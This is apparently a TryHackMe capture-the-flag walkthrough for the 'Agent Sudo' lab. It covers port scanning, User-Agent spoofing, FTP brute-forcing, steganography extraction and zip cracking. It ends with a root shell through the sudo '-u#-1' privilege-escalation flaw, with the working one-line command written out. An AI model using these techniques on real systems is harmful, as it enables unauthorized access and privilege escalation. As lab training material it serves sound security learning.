
# TryHackMe Walkthrough: Agent Sudo

In this room, we learn about:
- User-Agent manipulation  
- FTP brute-forcing  
- Steganography  
- Privilege escalation via outdated software  

---

## 🔍 Initial Enumeration

We start with an Nmap scan to identify open ports and services.

```bash
nmap -sS --top-ports 5000 10.80.185.245 -sV -oN scan.report
````

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29
```

So, **three ports are open**: FTP, SSH, and HTTP.

---

## 📂 FTP Enumeration

I first tried anonymous login on the FTP server, but it failed.
This means anonymous access is not configured, and we need valid credentials.

![FTP anonymous login failed](https://github.com/user-attachments/assets/0111b51c-9051-4c43-86f7-0eaa537dcabb)

---

## 🌐 Web Enumeration (Port 80)

Next, I checked what was running on port 80 by visiting the website.

![Web page on port 80](https://github.com/user-attachments/assets/8db544cd-4096-4403-a8f3-3dc60235e1f7)

The page indicates that access depends on the **User-Agent**.

---

## 🕵️ User-Agent Manipulation

A **User-Agent** is an HTTP header that tells the web server:

* Browser name
* Browser version
* Operating system

There are many ways to change it:

* Browser extensions
* Burp Suite
* Curl
* Scripts (Python, etc.)

I tried a custom User-Agent like `bunny`, but it didn’t work.
The room gives a hint that the User-Agent **starts with the letter `C`**.

```bash
curl -A "C" http://10.80.185.245 -L
```

Response:

```html
Attention chris,

Do you still remember our deal?
Please tell agent J about the stuff ASAP.
Also, change your god damn password, it is weak!

From,
Agent R
```

🎯 We now have a **username: `chris`**
The message also hints that the password is **weak**, likely for FTP.

---

## 🔐 FTP Brute Force

Using `chris` as the username, I performed an FTP brute-force attack and successfully obtained the password.

![FTP brute force success](https://github.com/user-attachments/assets/548d11dd-ed77-455e-9ad2-af8f3b28fc8e)

After logging in, I downloaded all the files.

![FTP downloaded files](https://github.com/user-attachments/assets/a6385526-f0ce-47e8-b789-05c576a274cc)

![FTP file listing](https://github.com/user-attachments/assets/30e5b4ec-aaab-413f-8ccc-2302f41352be)

---

## 🖼️ Steganography & File Analysis

I suspected hidden data inside the image files, so I used **binwalk**.

```bash
binwalk cutie.png
```

![Binwalk output](https://github.com/user-attachments/assets/61a87778-cc69-4097-a27d-0a4c48f0ee81)

`cutie.png` contains a **hidden ZIP file**.

---

## 📦 Extracting the ZIP

I extracted the ZIP file and found that it was **password protected**.

![Extracted zip file](https://github.com/user-attachments/assets/e4011ae5-7f0b-48a9-9d33-77da181950a3)

To crack it, I used `zip2john` and `john`.

![zip2john and john cracking](https://github.com/user-attachments/assets/8b744090-2df7-462b-af57-2463fda38c0e)

---

## 🔑 Decoding the Secret

After extracting the ZIP, I found a file containing **Base64-encoded text**.

![Base64 encoded text](https://github.com/user-attachments/assets/43fc9ee3-054c-48ed-a16b-7685ac6b7cfd)

After decoding it, I obtained another password, but I didn’t know where to use it yet.

---

## 🕵️ Steghide on cute-alien.jpg

From the FTP server, we also got another image: `cute-alien.jpg`.

![cute-alien.jpg](https://github.com/user-attachments/assets/90147787-2c1f-49a0-98c2-c2d39979d415)

I used `steghide` to extract hidden data:

```bash
steghide extract -sf cute-alien.jpg
```

It asked for a password. I tried the **Base64-decoded password**, and it worked.

🎉 This revealed a **new username and password**.

---

## 🔐 SSH Login

Using the extracted credentials, I logged in via SSH.

![SSH login success](https://github.com/user-attachments/assets/d0d617e3-00a8-4758-b034-63ee1e24624f)

---

## 🚀 Privilege Escalation (Sudo CVE)

Initially, I thought the room was asking for a **kernel CVE**, but that was incorrect.

The real issue is with **sudo version 1.8.21p2**.

User `james` has the following sudo permission:

```text
(ALL, !root) /bin/bash
```

This means:

* Can run `/bin/bash`
* As any user **except root**

However, sudo versions **before 1.8.28** are vulnerable.
Sudo fails to properly validate user IDs.
Using an invalid UID like `-1`, sudo treats it as UID `0` (root).

---

## 🧨 Exploitation

```bash
sudo -u#-1 /bin/bash
```

![Root shell](https://github.com/user-attachments/assets/af59c464-b4ab-4267-913c-ad57fdcf9f3c)

🔥 **Root access achieved!**

---

## 🏁 Conclusion

This room covers:

* Enumeration
* User-Agent abuse
* FTP brute-forcing
* Steganography
* Privilege escalation using a real sudo CVE

Exploit reference:
[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

Keep learning and stay creative 🚀

```


```
